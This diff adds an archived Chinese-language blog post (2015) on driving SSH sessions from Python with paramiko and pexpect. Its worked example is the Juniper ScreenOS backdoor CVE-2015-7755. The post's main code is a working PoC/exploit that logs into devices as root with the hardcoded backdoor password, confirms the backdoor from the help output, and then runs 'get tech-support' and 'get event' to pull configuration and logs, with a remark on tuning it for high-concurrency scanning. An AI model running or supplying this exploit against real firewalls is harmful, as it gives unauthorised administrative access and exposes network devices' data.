@@ -1,0 +1,986 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Python,Security,CVE,PoC/Exp,Vul,SSH," />
+
+
+
+
+
+  <link rel="alternate" href="/rss2.xml" title="雪泥鴻爪" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon/eye.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="Title(EN): Shell Interaction in Python #2: SSH
+Author: dog2
+
+
+0x00 难点1. 模块选择对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。
+(1) paramikoSSH交互最常用的是第三方模块是paramiko：
+
+文档
+源码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（二）: SSH篇">
+<meta property="og:url" content="http://dog.wtf/tech/shell-interaction-in-python-2-ssh/index.html">
+<meta property="og:site_name" content="雪泥鴻爪">
+<meta property="og:description" content="Title(EN): Shell Interaction in Python #2: SSH
+Author: dog2
+
+
+0x00 难点1. 模块选择对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。
+(1) paramikoSSH交互最常用的是第三方模块是paramiko：
+
+文档
+源码">
+<meta property="og:updated_time" content="2016-06-07T13:59:15.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（二）: SSH篇">
+<meta name="twitter:description" content="Title(EN): Shell Interaction in Python #2: SSH
+Author: dog2
+
+
+0x00 难点1. 模块选择对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。
+(1) paramikoSSH交互最常用的是第三方模块是paramiko：
+
+文档
+源码">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <title> Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（二）: SSH篇 | 雪泥鴻爪 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-71835065-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">雪泥鴻爪</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">dog2's blog</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            4♡4
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="#" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（二）: SSH篇
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2015-12-30T22:22:22+08:00" content="2015-12-30">
+              2015-12-30
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/tech/" itemprop="url" rel="index">
+                    <span itemprop="name">Tech</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/tech/shell-interaction-in-python-2-ssh/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="tech/shell-interaction-in-python-2-ssh/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ul>
+<li>Title(EN): <em><strong>Shell Interaction in Python #2: SSH</strong></em></li>
+<li>Author: dog2</li>
+</ul>
+<hr>
+<h3 id="0x00-难点"><a href="#0x00-难点" class="headerlink" title="0x00 难点"></a>0x00 难点</h3><h4 id="1-模块选择"><a href="#1-模块选择" class="headerlink" title="1. 模块选择"></a>1. 模块选择</h4><p>对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。</p>
+<h5 id="1-paramiko"><a href="#1-paramiko" class="headerlink" title="(1) paramiko"></a>(1) paramiko</h5><p>SSH交互最常用的是第三方模块是paramiko：</p>
+<ul>
+<li><a href="http://docs.paramiko.org/" target="_blank" rel="external">文档</a></li>
+<li><a href="https://github.com/paramiko/paramiko/tree/master/paramiko" target="_blank" rel="external">源码</a></li>
+</ul>
+<a id="more"></a>
+<p>下面给出使用paramiko进行ssh登录的一个demo:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sshLogin</span><span class="params">(host, username, password, port=<span class="number">22</span>, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh.connect(</span><br><span class="line">            host,</span><br><span class="line">            username=username,</span><br><span class="line">            password=password,</span><br><span class="line">            timeout=timeout,</span><br><span class="line">            compress=<span class="keyword">True</span>,</span><br><span class="line">            allow_agent=<span class="keyword">False</span>,</span><br><span class="line">            look_for_keys=<span class="keyword">False</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.authenticated</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.get_banner()</span><br><span class="line">        stdin, stdout, stderr = ssh.exec_command(<span class="string">'ls'</span>, bufsize=<span class="number">1024</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stdout:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'... '</span> + line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        ssh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.AuthenticationException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.SSHException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
+<p>代码说明：</p>
+<ul>
+<li>17行：用于判断是否登录成功</li>
+<li>18行：用于输出ssh banner，即登录成功后的欢迎字符串，比如我的vps登录成功后有如下欢迎字符串:</li>
+</ul>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Welcome</span> to Ubuntu <span class="number">14</span>.<span class="number">04</span>.<span class="number">3</span> LTS (GNU/Linux <span class="number">3</span>.<span class="number">13</span>.<span class="number">0</span>-<span class="number">68</span>-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line">Last login: Wed Dec <span class="number">30</span> <span class="number">01</span>:<span class="number">55</span>:<span class="number">57</span> <span class="number">2015</span> from <span class="number">222.222.222.222</span></span><br><span class="line">root<span class="variable">@vultr</span>:~<span class="comment"># c</span></span><br></pre></td></tr></table></figure>
+<p>使用如上demo函数尝试登录我的vps，成功登录并打印了ls命令的输出。</p>
+<p>但是存在如下问题：</p>
+<ul>
+<li>使用如上sshLogin函数登录juniper设备，代码运行到17行时输出为True，说明成功登录了，但当执行到第19行时，会出现如下错误：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/client.py"</span>, line 405, <span class="keyword">in</span> <span class="built_in">exec</span>_<span class="built_in">command</span></span><br><span class="line">    chan.exec_<span class="built_in">command</span>(<span class="built_in">command</span>)</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, line 60, <span class="keyword">in</span> _check</span><br><span class="line">    <span class="built_in">return</span> func(self, *args, **kwds)</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, line 229, <span class="keyword">in</span> <span class="built_in">exec</span>_<span class="built_in">command</span></span><br><span class="line">    self._<span class="built_in">wait</span>_<span class="keyword">for</span>_event()</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, line 1086, <span class="keyword">in</span> _<span class="built_in">wait</span>_<span class="keyword">for</span>_event</span><br><span class="line">    raise e</span><br><span class="line">paramiko.ssh_exception.SSHException: Channel closed.</span><br></pre></td></tr></table></figure>
+<p>这会导致SSH连接的中断，导致这种异常的原因，可能是juniper这种设备的SSH实现是非标准的，而paramiko对这些非标准SSH支持不佳所致，而使用Unix/Linux自带的SSH客户端程序登陆这些设备就没有这种问题。看来paramiko并不是完美的解决方案，如果仅仅需要验证是否登陆成功，它还是可以满足的。</p>
+<ul>
+<li>无论目标是我的vps还是juniper设备，第18行输出的都是空字符串。在google上百度了一下，有人遇到类似问题（<a href="https://github.com/paramiko/paramiko/issues/273" target="_blank" rel="external">#1</a> <a href="https://github.com/paramiko/paramiko/pull/58" target="_blank" rel="external">#2</a> <a href="http://stackoverflow.com/questions/25609153/paramiko-error-reading-ssh-protocol-banner" target="_blank" rel="external">#3</a>），也有人做了解答，但大都还是说调用get_banner()函数，并不是解决办法。猜测这可能是paramiko自身的问题，没有深究，如果您知道原因及解决办法，还请指教。</li>
+</ul>
+<h5 id="2-pexpect"><a href="#2-pexpect" class="headerlink" title="(2) pexpect"></a>(2) pexpect</h5><p>从Freebuf文章 <a href="http://www.freebuf.com/vuls/90886.html" target="_blank" rel="external">“利用Censys批量获取Juniper Netscreen后门”</a> 中了解到pexpect可以用来实现SSH交互，于是简单了解一番。</p>
+<ul>
+<li><a href="http://pexpect.readthedocs.org/" target="_blank" rel="external">文档</a></li>
+<li><a href="https://github.com/pexpect/pexpect/tree/master/pexpect" target="_blank" rel="external">源码</a></li>
+<li>相关资料:<ul>
+<li><a href="http://www.ibm.com/developerworks/cn/linux/l-cn-pexpect1/" target="_blank" rel="external">探索 Pexpect，第 1 部分：剖析 Pexpect</a></li>
+<li><a href="http://www.ibm.com/developerworks/cn/linux/l-cn-pexpect2/" target="_blank" rel="external">探索 Pexpect，第 2 部分：Pexpect 的实例分析</a></li>
+</ul>
+</li>
+</ul>
+<p>Freebuf的文章中提到了编写PoC验证设备是否还存在漏洞的思路：</p>
+<blockquote>
+<p>其实由于登录后并不是传统的SSH，而是该防火墙的操作终端，因此pxssh会认为并没有登录成功，而是返回超时异常，此时我们检测其返回的before字段如果有Remote Management Console字样就说明该主机存在后门。</p>
+</blockquote>
+<p>其中提到的pxssh是pexpect中的一个类pexpect.pxssh.pxssh，编写SSH交互程序需要用到它，使用示例参见<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-pexpect2/" target="_blank" rel="external">IBM的文档</a>。</p>
+<p>尝试了一番，pxssh其实是可以登陆成功的，并没有文章中所说的 “返回异常”。</p>
+<p>其实pxssh底层实现还是以进程的方式调用Unix/Linux自带的SSH可执行程序的，而正如上面提到的自带的SSH兼容性很强，因此使用pxssh编写PoC是不错的选择。</p>
+<p>但若将程序用于高并发扫描，需要权衡一下并发数与机器性能，因为每扫描一个目标就需要运行一个SSH客户端程序进程。</p>
+<h4 id="2-Exp"><a href="#2-Exp" class="headerlink" title="2. Exp"></a>2. Exp</h4><p>PoC可以编写了，接下来是Exp，目标还是执行如下2个命令：</p>
+<ul>
+<li><em><strong>get tech-support</strong></em> : 它综合了大部分get子命令的结果。</li>
+<li><em><strong>get event</strong></em> : 包含了设备日志。</li>
+</ul>
+<p>SSH Exp的逻辑与Telnet几乎一样，但是 pexpect.pxssh.pxssh 类中并没有类似于 telnetlib.Telnet 类中的 read_until(expected[, timeout]) 这种函数。</p>
+<p>我们可以使用实例函数 pxssh.sendline(cmd) 来发送命令，其中cmd为命令字符串，结尾不必包含\n，函数会在命令结尾自动添加。</p>
+<p>但使用pxssh编写Exp，还是存在如下问题：</p>
+<ul>
+<li>pxssh默认将上一次命令执行后返回的结果字符串存储在实例变量pxssh.before中，但是在多次获取结果分段时，连续2次获取的消息分段会有重叠。</li>
+<li>从源码可以看到pxssh类继承自pexpect.pyt_spawn.spawn类，而spawn类又继承自pexpect.spawnbase.SpawnBase类。在SpawnBase类中，存在类变量buffer，用于接收服务器端发回的消息。因此尝试直接使用pxssh.buffer变量来代替before变量，并在每一次发送新的命令之前，将pxssh.buffer清空，但是又出现了结果不完整的问题。</li>
+<li>可以尝试使用<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-pexpect2/" target="_blank" rel="external">IBM的文章</a>中 “例 3：ssh 的使用” 提到的，直接使用spawn类来实现，但是该类较为底层，需要我们自己处理SSH的登录及交互逻辑，且其中expect函数的pattern参数需为pexpect.expect中定义的类实例，而不是直接传入字符串或正则表达式，使用起来较为繁琐。</li>
+</ul>
+<p>最终找到了合适的类函数 pexpect.pty_spawn.read_nonblocking(size=1, timeout=-1) ，它读取服务器端发来的数据，直到数据字节数达到size，或者达到超时时间timeout。但终止字符串就还需由我们自己判断。</p>
+<h3 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pexpect <span class="keyword">import</span> pxssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">22</span>, loginTimeout=<span class="number">10</span>,</span><br><span class="line">        readTimeout=<span class="number">2</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">readUntilTimeout</span><span class="params">()</span>:</span></span><br><span class="line">            errFlag = <span class="keyword">False</span></span><br><span class="line">            data = <span class="string">''</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> errFlag:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data += ssh.read_nonblocking(</span><br><span class="line">                        size=<span class="number">65536</span>,</span><br><span class="line">                        timeout=readTimeout</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">except</span> pexpect.exceptions.ExceptionPexpect <span class="keyword">as</span> err:</span><br><span class="line">                    errFlag = <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">        readUntilTimeout()  <span class="comment"># skip verbose strings</span></span><br><span class="line">        toNum = <span class="number">0</span></span><br><span class="line">        ssh.send(cmd + <span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        data = readUntilTimeout()</span><br><span class="line">        ret = data</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'-&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="number">-10</span>:]) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            data = readUntilTimeout()</span><br><span class="line">            ret += data</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ssh.send(<span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    ssh = pxssh.pxssh(timeout=readTimeout)</span><br><span class="line">    ssh.login(</span><br><span class="line">        server=host,</span><br><span class="line">        port=port,</span><br><span class="line">        username=<span class="string">'root'</span>,</span><br><span class="line">        password=<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span>,</span><br><span class="line">        auto_prompt_reset=<span class="keyword">False</span>,</span><br><span class="line">        login_timeout=loginTimeout,</span><br><span class="line">    )</span><br><span class="line">    banner = ssh.before</span><br><span class="line">    ssh.sendline(<span class="string">'?'</span>)</span><br><span class="line">    help = ssh.read_nonblocking(size=<span class="number">65536</span>, timeout=readTimeout)</span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>
+<p>代码说明：</p>
+<ul>
+<li>26行：连续发送多个\n，一次性将服务器端的多个结果分段获取到客户端的接收缓存中，这样可以减少交互，提高程序效率。</li>
+<li>29行：判断每次读取的缓存区中的数据的后10个字符串中是否存在 <strong>-&gt;</strong> 字符，来识别最后一个结果分段。</li>
+</ul>
+<p>代码逻辑与Telnet程序类似。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/python/" rel="tag">#Python</a>
+          
+            <a href="/tags/security/" rel="tag">#Security</a>
+          
+            <a href="/tags/cve/" rel="tag">#CVE</a>
+          
+            <a href="/tags/poc-exp/" rel="tag">#PoC/Exp</a>
+          
+            <a href="/tags/vul/" rel="tag">#Vul</a>
+          
+            <a href="/tags/ssh/" rel="tag">#SSH</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/tech/downloading-ftp-directory-recursively-with-python/" rel="next" title="Python实现下载FTP服务器的整个目录（文件夹）">
+                <i class="fa fa-chevron-left"></i> Python实现下载FTP服务器的整个目录（文件夹）
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/tech/shell-interaction-in-python-1-telnet/" rel="prev" title="Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇">
+                Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/dog2.jpg"
+               alt="dog2" />
+          <p class="site-author-name" itemprop="name">dog2</p>
+          <p class="site-description motion-element" itemprop="description">Where is dog1 ?</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">5</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/rss2.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/dog-2" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              G.U.
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.php101.cn/" title="php101" target="_blank">php101</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-难点"><span class="nav-text">0x00 难点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-模块选择"><span class="nav-text">1. 模块选择</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-paramiko"><span class="nav-text">(1) paramiko</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-pexpect"><span class="nav-text">(2) pexpect</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Exp"><span class="nav-text">2. Exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-代码"><span class="nav-text">0x01 代码</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
